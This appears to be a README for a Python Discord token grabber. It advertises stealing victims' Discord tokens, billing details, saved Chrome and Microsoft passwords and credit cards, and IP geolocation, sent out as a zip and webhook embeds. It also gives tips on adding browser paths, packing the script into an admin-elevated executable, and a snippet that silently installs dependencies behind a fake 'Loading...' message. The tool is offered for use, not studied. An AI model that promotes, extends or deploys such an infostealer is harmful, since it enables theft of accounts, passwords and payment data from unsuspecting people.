# What about the [**flafla_in_your_discord_zbi.py**](./flafla_in_your_discord_zbi.py) file ?

## Setting up

**For the set-up check the [Setting up](./README_MGL.md) section of main README**

## Fonctionalities 
***
The different fonctionalities of my discord Token Grabber  
![logo](https://over-spam.space/assets/img/favicon.png)  
### Discord account infos :

- [x] Email   
- [x] Registered Phone
- [x] Nitro status
- [x] Billing infos
- [x] Discord Tokens 

### Pc infos : 
- [x] Computer OS
- [x] Username 
- [x] PC Name
- [x] Token Location

### GEO-IP Infos

- [x] IP addr
- [x] Geolocation (gps coordinates with gg map link)
- [x] City (conceptual location regarding the IP)
- [x] Region

### Other infos

- [x] Country
- [x] Email Status
- [x] 2FA/MFA Status
- [x] Creation date

### Stored infos

- [x] Locally stored password
  - [x] Microsoft
  - [x] Chrome 
- [x] Locally Stored CC infos
  - [x] Microsoft
  - [x] Chrome

### Additional infos

+ The last part od Stored infos are send in a separate .zip file before the embeds informations
+ There is one embed per account registered in the computer through :
  - [x] Discord
  - [x] Discord Canary
  - [x] Discord PTB
  - [x] Google Chrome
  - [x] Opera
  - [x] Brave
  - [x] Yandex
  - You can add Some Tokens path for other browsers if you know it in the `PATHS` constant `line 63` while respecting the structure  

### Some other things to know about 

You can easily convert the file in an executable with any converter

If you are using an executable version, you can dodge the requirements installation phase by adding this :  

`| line 12 |`


    try:
	    import dhooks
    except ImportError:
        print('Loading...')
	    os.system("pip install dhooks > nul")
        os.system('cls')
    try:
	    import cryptography
    except ImportError:
        print('Loading...')
	    os.system("pip instll cryptography > nul")
        os.system('cls')


Knowing that you have the possibility with an executable to ask for the admins rights which avoids the problems of privileges (I strongly recommanded [auto-py-to-exe](https://pypi.org/project/auto-py-to-exe/) it's easy and efficient)

***
## SirThirrygolooo
